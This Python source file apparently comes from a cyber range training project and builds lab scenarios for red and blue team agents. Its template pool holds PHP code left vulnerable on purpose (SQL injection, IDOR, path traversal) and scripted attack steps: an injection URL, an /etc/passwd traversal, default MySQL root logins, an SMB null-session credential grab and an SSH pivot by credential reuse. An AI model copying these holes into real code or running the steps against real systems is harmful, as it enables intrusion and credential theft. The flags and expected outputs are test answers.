"""Three SnapshotBuilder implementations for OpenRange.

- LLMSnapshotBuilder: production -- uses litellm to generate snapshot specs
- TemplateOnlyBuilder: testing -- deterministic, no LLM calls
- FileBuilder: demos -- loads a pre-built snapshot from a JSON file
"""

from __future__ import annotations

import json
import logging
import os
import random
from pathlib import Path
from typing import Any

try:
    import litellm
except ImportError:  # pragma: no cover - exercised only without builder extra
    litellm = None

from open_range.protocols import (
    BuildContext,
    EvidenceItem,
    FlagSpec,
    GoldenPathStep,
    NPCPersona,
    NPCTrafficSpec,
    SnapshotSpec,
    TaskSpec,
    TruthGraph,
    Vulnerability,
)

from open_range.builder.prompts import BUILDER_SYSTEM_PROMPT

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# LLM-based builder (production)
# ---------------------------------------------------------------------------


class LLMSnapshotBuilder:
    """Generate snapshot specs via LiteLLM.

    Reads model from ``OPENRANGE_BUILDER_MODEL`` env var.
    Default: ``anthropic/claude-sonnet-4-20250514``.
    """

    def __init__(
        self,
        model: str | None = None,
        prompt_template: str | None = None,
        temperature: float = 0.7,
        max_retries: int = 3,
    ) -> None:
        self.model = model or os.environ.get(
            "OPENRANGE_BUILDER_MODEL", "anthropic/claude-sonnet-4-20250514"
        )
        self.prompt_template = prompt_template or BUILDER_SYSTEM_PROMPT
        self.temperature = temperature
        self.max_retries = max_retries

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Call LLM to generate a candidate snapshot spec."""
        if litellm is None:
            raise RuntimeError(
                "LLMSnapshotBuilder requires the optional builder extra. "
                "Install with `pip install open-range[builder]`."
            )

        user_payload = json.dumps(
            {
                "manifest": manifest,
                "runtime_context": context.model_dump(),
            },
            indent=2,
        )

        last_error: Exception | None = None
        for attempt in range(1, self.max_retries + 1):
            try:
                messages: list[dict[str, str]] = [
                    {"role": "system", "content": self.prompt_template},
                    {"role": "user", "content": user_payload},
                ]
                # If retrying after a validation error, append error context
                error = getattr(context, "error", None)
                if error and attempt > 1:
                    messages.append(
                        {
                            "role": "user",
                            "content": (
                                "Previous attempt failed validation. "
                                f"Error: {json.dumps(error)}\n"
                                "Please fix and regenerate."
                            ),
                        }
                    )

                response = await litellm.acompletion(
                    model=self.model,
                    messages=messages,
                    response_format={"type": "json_object"},
                    temperature=self.temperature,
                )

                raw = response.choices[0].message.content
                spec = _parse_llm_response(raw)
                logger.info(
                    "LLMSnapshotBuilder: generated snapshot %s (attempt %d)",
                    spec.topology.get("hosts", [])[:3],
                    attempt,
                )
                return spec

            except Exception as exc:
                last_error = exc
                logger.warning(
                    "LLMSnapshotBuilder attempt %d/%d failed: %s",
                    attempt,
                    self.max_retries,
                    exc,
                )

        raise RuntimeError(
            f"LLMSnapshotBuilder: all {self.max_retries} attempts failed. "
            f"Last error: {last_error}"
        )


def _parse_llm_response(raw_json: str) -> SnapshotSpec:
    """Parse raw JSON from LLM into a validated SnapshotSpec.

    Handles the fact that the LLM output schema (from docs/builder-validator.md)
    differs slightly from the SnapshotSpec Pydantic model in protocols.py.
    """
    data = json.loads(raw_json)

    # Map truth_graph vulns
    vulns = []
    for v in data.get("truth_graph", {}).get("vulns", []):
        vulns.append(
            Vulnerability(
                id=v.get("id", ""),
                type=v.get("type", ""),
                host=v.get("host", ""),
                service=v.get("service", ""),
                injection_point=v.get("injection_point", ""),
                vulnerable_code=v.get("vulnerable_code", ""),
                root_cause=v.get("root_cause", ""),
                blast_radius=v.get("blast_radius", ""),
                remediation=v.get("remediation", ""),
            )
        )

    truth_graph = TruthGraph(
        vulns=vulns,
        exploit_chain=data.get("truth_graph", {}).get("exploit_chain", []),
    )

    # Map golden_path -- LLM uses "expect_stdout", protocol uses "expect_in_stdout"
    golden_path = []
    for step in data.get("golden_path", []):
        golden_path.append(
            GoldenPathStep(
                step=step.get("step", 0),
                command=step.get("cmd", step.get("command", "")),
                expect_in_stdout=step.get(
                    "expect_stdout", step.get("expect_in_stdout", "")
                ),
                description=step.get("description", ""),
            )
        )

    # Map flags
    flags = [
        FlagSpec(
            id=f.get("id", ""),
            value=f.get("value", ""),
            path=f.get("path", ""),
            host=f.get("host", ""),
        )
        for f in data.get("flags", [])
    ]

    # Map evidence_spec -- LLM returns dict, protocol expects list[EvidenceItem]
    evidence_raw = data.get("evidence_spec", {})
    evidence_spec: list[EvidenceItem] = []
    if isinstance(evidence_raw, dict):
        for key, val in evidence_raw.items():
            if isinstance(val, list):
                for item in val:
                    evidence_spec.append(
                        EvidenceItem(type="alert", location=key, pattern=str(item))
                    )
            else:
                evidence_spec.append(
                    EvidenceItem(type="log_entry", location=key, pattern=str(val))
                )
    elif isinstance(evidence_raw, list):
        for item in evidence_raw:
            if isinstance(item, dict):
                evidence_spec.append(EvidenceItem(**item))

    # Map NPC personas
    npc_personas = []
    for p in data.get("npc_personas", []):
        npc_personas.append(
            NPCPersona(
                name=p.get("name", ""),
                role=p.get("role", ""),
                department=p.get("department", ""),
                reports_to=p.get("reports_to", ""),
                communication_style=p.get("communication_style", ""),
                security_awareness=p.get("security_awareness", 0.5),
                susceptibility=p.get("susceptibility", {}),
                routine=p.get("routine", {}),
                accounts=p.get("accounts", {}),
            )
        )

    # Map NPC traffic
    npc_raw = data.get("npc_traffic", {})
    npc_traffic = NPCTrafficSpec(
        level=0,
        rate_lambda=npc_raw.get("http_rate", 10),
        scripts=["http_traffic.sh", "db_traffic.sh", "ssh_traffic.sh"],
    )

    # Map task
    task_raw = data.get("task", {})
    task = TaskSpec(
        red_briefing=task_raw.get("red_briefing", ""),
        blue_briefing=task_raw.get("blue_briefing", ""),
    )

    return SnapshotSpec(
        topology=data.get("topology", {}),
        truth_graph=truth_graph,
        golden_path=golden_path,
        flags=flags,
        evidence_spec=evidence_spec,
        npc_personas=npc_personas,
        npc_traffic=npc_traffic,
        task=task,
    )


# ---------------------------------------------------------------------------
# Template-only builder (testing)
# ---------------------------------------------------------------------------

# Hardcoded vuln pool for deterministic testing
_DEFAULT_VULN_POOL: list[dict[str, Any]] = [
    {
        "id": "vuln_sqli",
        "type": "sqli",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/search?q=",
        "vulnerable_code": (
            '<?php $q=$_GET["q"]; '
            '$r=$conn->query("SELECT * FROM products WHERE name LIKE \'%$q%\'"); '
            "while($row=$r->fetch_assoc()) echo $row['name']; ?>"
        ),
        "root_cause": "Unsanitized user input in SQL query",
        "blast_radius": "Full database read access",
        "remediation": "Use parameterized queries",
        "flag_id": "flag1",
        "flag_value": "FLAG{sql1_t3st_f1ag}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/search?q=test",
                "expect_stdout": "product",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl 'http://web/search?q=test%27%20UNION%20SELECT%20flag%20FROM%20flags.secrets--%20'",
                "expect_stdout": "FLAG{sql1_t3st_f1ag}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{sql1_t3st_f1ag}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_idor",
        "type": "idor",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/api/users/{id}/profile",
        "vulnerable_code": (
            "<?php $id=$_GET['id']; "
            '$stmt=$conn->query("SELECT * FROM users WHERE id=$id"); '
            "echo json_encode($stmt->fetch_assoc()); ?>"
        ),
        "root_cause": "No authorization check on user ID parameter",
        "blast_radius": "User data exposure, credential leakage",
        "remediation": "Add session-based authorization check before query",
        "flag_id": "flag1",
        "flag_value": "FLAG{1d0r_pr0f1le_l3ak}",
        "flag_path": "db:flags.secrets.flag",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/api/users/1/profile",
                "expect_stdout": "admin",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl http://web/api/users/2/profile",
                "expect_stdout": "password",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "mysql -h db -u leaked_user -pleaked_pass -e 'SELECT flag FROM flags.secrets'",
                "expect_stdout": "FLAG{1d0r_pr0f1le_l3ak}",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "submit_flag FLAG{1d0r_pr0f1le_l3ak}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_path_traversal",
        "type": "path_traversal",
        "host": "web",
        "service": "nginx+php",
        "injection_point": "/download?file=",
        "vulnerable_code": (
            "<?php $file=$_GET['file']; "
            "readfile('/var/www/uploads/' . $file); ?>"
        ),
        "root_cause": "No path sanitization on file parameter",
        "blast_radius": "Arbitrary file read on web server",
        "remediation": "Validate and sanitize file path, use basename()",
        "flag_id": "flag1",
        "flag_value": "FLAG{p4th_tr4v3rs4l_fl4g}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl http://web/",
                "expect_stdout": "Welcome",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "curl http://web/download?file=report.pdf",
                "expect_stdout": "PDF",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "curl 'http://web/download?file=../../../etc/passwd'",
                "expect_stdout": "root:",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "curl 'http://web/download?file=../../../var/flags/flag1.txt'",
                "expect_stdout": "FLAG{p4th_tr4v3rs4l_fl4g}",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "submit_flag FLAG{p4th_tr4v3rs4l_fl4g}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_weak_creds",
        "type": "weak_creds",
        "host": "db",
        "service": "mysql",
        "injection_point": "mysql -u root -proot",
        "vulnerable_code": "",
        "root_cause": "MySQL root account with default password",
        "blast_radius": "Full database access",
        "remediation": "Change root password, restrict remote root login",
        "flag_id": "flag1",
        "flag_value": "FLAG{w3ak_cr3ds_r00t}",
        "flag_path": "db:flags.secrets.flag",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "nmap -sV 10.0.2.0/24",
                "expect_stdout": "3306/tcp open mysql",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "mysql -h db -u root -proot -e 'SHOW DATABASES'",
                "expect_stdout": "flags",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "mysql -h db -u root -proot -e 'SELECT flag FROM flags.secrets'",
                "expect_stdout": "FLAG{w3ak_cr3ds_r00t}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{w3ak_cr3ds_r00t}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_smb_misconfig",
        "type": "smb_misconfig",
        "host": "files",
        "service": "samba",
        "injection_point": "smbclient -N //files/general",
        "vulnerable_code": "",
        "root_cause": "Samba share allows guest access (null session) — IT enabled it for a migration and never reverted",
        "blast_radius": "Read access to internal documents, credential files in share",
        "remediation": "Disable guest access, require LDAP authentication for all shares",
        "flag_id": "flag1",
        "flag_value": "FLAG{smb_null_s3ss10n}",
        "flag_path": "/srv/shares/general/admin_creds.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "nmap -sV -p 445 10.0.2.0/24",
                "expect_stdout": "445/tcp open microsoft-ds",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "smbclient -N -L //files/",
                "expect_stdout": "general",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "smbclient -N //files/general -c 'ls'",
                "expect_stdout": "admin_creds",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "smbclient -N //files/general -c 'get admin_creds.txt /tmp/creds.txt'",
                "expect_stdout": "getting file",
                "host": "attacker",
            },
            {
                "step": 6,
                "cmd": "cat /tmp/creds.txt",
                "expect_stdout": "FLAG{smb_null_s3ss10n}",
                "host": "attacker",
            },
            {
                "step": 7,
                "cmd": "submit_flag FLAG{smb_null_s3ss10n}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
    {
        "id": "vuln_credential_reuse",
        "type": "credential_reuse",
        "host": "ldap",
        "service": "openldap",
        "injection_point": "LDAP bind with web app service account credentials",
        "vulnerable_code": "",
        "root_cause": "Web app config.php contains LDAP bind DN and password; same credentials reuse for SSH on db host",
        "blast_radius": "Lateral movement from web → db via credential reuse, flag exfiltration",
        "remediation": "Unique credentials per service, rotate LDAP bind password, restrict SSH key-only auth",
        "flag_id": "flag1",
        "flag_value": "FLAG{cr3d_r3us3_p1v0t}",
        "flag_path": "/var/flags/flag1.txt",
        "golden_path_steps": [
            {
                "step": 1,
                "cmd": "nmap -sV 10.0.1.0/24",
                "expect_stdout": "80/tcp open http",
                "host": "attacker",
            },
            {
                "step": 2,
                "cmd": "curl 'http://web/download?file=../../../var/www/config.php'",
                "expect_stdout": "ldap_bind_pw",
                "host": "attacker",
            },
            {
                "step": 3,
                "cmd": "ldapsearch -x -H ldap://ldap -D 'cn=webapp,dc=corp,dc=local' -w 'Svc!Ldap2024' -b 'dc=corp,dc=local' '(uid=*)'",
                "expect_stdout": "dn: uid=",
                "host": "attacker",
            },
            {
                "step": 4,
                "cmd": "sshpass -p 'Svc!Ldap2024' ssh svc_webapp@db 'cat /var/flags/flag1.txt'",
                "expect_stdout": "FLAG{cr3d_r3us3_p1v0t}",
                "host": "attacker",
            },
            {
                "step": 5,
                "cmd": "submit_flag FLAG{cr3d_r3us3_p1v0t}",
                "expect_stdout": "correct",
                "host": "attacker",
            },
        ],
    },
]


class TemplateOnlyBuilder:
    """Deterministic builder for testing -- no LLM calls.

    Picks vulnerabilities from a hardcoded pool based on seed.
    """

    def __init__(self, vuln_pool: list[dict[str, Any]] | None = None) -> None:
        self.vuln_pool = vuln_pool or _DEFAULT_VULN_POOL

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Build a snapshot deterministically from the vuln pool."""
        rng = random.Random(context.seed if context.seed is not None else 42)

        # Filter pool to allowed bug_families
        allowed = set(manifest.get("bug_families", []))
        candidates = [v for v in self.vuln_pool if v["type"] in allowed]
        if not candidates:
            candidates = list(self.vuln_pool)

        # Avoid recently used vuln classes
        previous = set(context.previous_vuln_classes)
        preferred = [v for v in candidates if v["type"] not in previous]
        if preferred:
            candidates = preferred

        # Pick 1-2 vulns
        max_vulns = manifest.get("difficulty", {}).get("max_vulns", 2)
        min_vulns = manifest.get("difficulty", {}).get("min_vulns", 1)
        count = rng.randint(min_vulns, min(max_vulns, len(candidates)))
        chosen = rng.sample(candidates, count)

        # Build topology from manifest
        topo = manifest.get("topology", {})
        hosts = [h["name"] if isinstance(h, dict) else h for h in topo.get("hosts", [])]
        networks = topo.get("networks", [])
        zones: dict[str, list[str]] = {}
        for h in topo.get("hosts", []):
            if isinstance(h, dict):
                z = h.get("zone", "default")
                zones.setdefault(z, []).append(h["name"])

        topology = {
            "hosts": hosts,
            "zones": zones,
            "users": [
                {
                    "username": "admin",
                    "password": "Adm1n!Test",
                    "groups": ["admins"],
                    "hosts": ["web", "db"],
                },
                {
                    "username": "testuser",
                    "password": "Test!2024",
                    "groups": ["users"],
                    "hosts": ["web"],
                },
            ],
        }

        # Build truth graph
        vulns = []
        exploit_chain = []
        flags = []
        golden_path: list[GoldenPathStep] = []
        step_offset = 0

        for idx, v in enumerate(chosen):
            vulns.append(
                Vulnerability(
                    id=v["id"],
                    type=v["type"],
                    host=v["host"],
                    service=v.get("service", ""),
                    injection_point=v.get("injection_point", ""),
                    vulnerable_code=v.get("vulnerable_code", ""),
                    root_cause=v.get("root_cause", ""),
                    blast_radius=v.get("blast_radius", ""),
                    remediation=v.get("remediation", ""),
                )
            )
            exploit_chain.append(
                {
                    "vuln_id": v["id"],
                    "command": v.get("injection_point", ""),
                    "description": f"Exploit {v['type']} on {v['host']}",
                }
            )
            flags.append(
                FlagSpec(
                    id=v.get("flag_id", f"flag{idx+1}"),
                    value=v.get("flag_value", f"FLAG{{test_{idx+1}}}"),
                    path=v.get("flag_path", f"/var/flags/flag{idx+1}.txt"),
                    host=v.get("host", "web"),
                )
            )
            for gs in v.get("golden_path_steps", []):
                step_offset += 1
                golden_path.append(
                    GoldenPathStep(
                        step=step_offset,
                        command=gs["cmd"],
                        expect_in_stdout=gs["expect_stdout"],
                        description=gs.get("description", ""),
                    )
                )

        truth_graph = TruthGraph(vulns=vulns, exploit_chain=exploit_chain)

        evidence_spec = [
            EvidenceItem(
                type="log_entry",
                location="web_access_log",
                pattern="attack pattern from attacker IP",
            ),
            EvidenceItem(
                type="alert",
                location="siem_alerts",
                pattern="Suspicious activity detected",
            ),
        ]

        task = TaskSpec(
            red_briefing=(
                "A corporate network with web services and backend infrastructure. "
                "Investigate the environment and capture the flags."
            ),
            blue_briefing=(
                "You are the SOC analyst. Monitor the SIEM for suspicious activity, "
                "investigate alerts, and respond to threats."
            ),
        )

        npc_traffic = NPCTrafficSpec(
            level=0,
            rate_lambda=10.0,
            scripts=["http_traffic.sh", "db_traffic.sh"],
        )

        return SnapshotSpec(
            topology=topology,
            truth_graph=truth_graph,
            golden_path=golden_path,
            flags=flags,
            evidence_spec=evidence_spec,
            npc_personas=[],
            npc_traffic=npc_traffic,
            task=task,
        )


# ---------------------------------------------------------------------------
# File-based builder (demos)
# ---------------------------------------------------------------------------


class FileBuilder:
    """Load a pre-built snapshot from a JSON file on disk.

    For demos and smoke tests where you want instant, known-good snapshots
    without any LLM calls.
    """

    def __init__(self, snapshot_dir: str = "snapshots") -> None:
        self.snapshot_dir = Path(snapshot_dir)

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Load the snapshot JSON, optionally picking by seed."""
        if not self.snapshot_dir.exists():
            raise FileNotFoundError(
                f"Snapshot directory not found: {self.snapshot_dir}"
            )

        files = sorted(self.snapshot_dir.glob("**/spec.json"))
        if not files:
            # Fall back to any .json files
            files = sorted(self.snapshot_dir.glob("*.json"))
        if not files:
            raise FileNotFoundError(
                f"No snapshot JSON files found in {self.snapshot_dir}"
            )

        if context.seed is not None:
            chosen = files[context.seed % len(files)]
        else:
            chosen = files[0]

        raw = json.loads(chosen.read_text())
        return _parse_llm_response(json.dumps(raw))
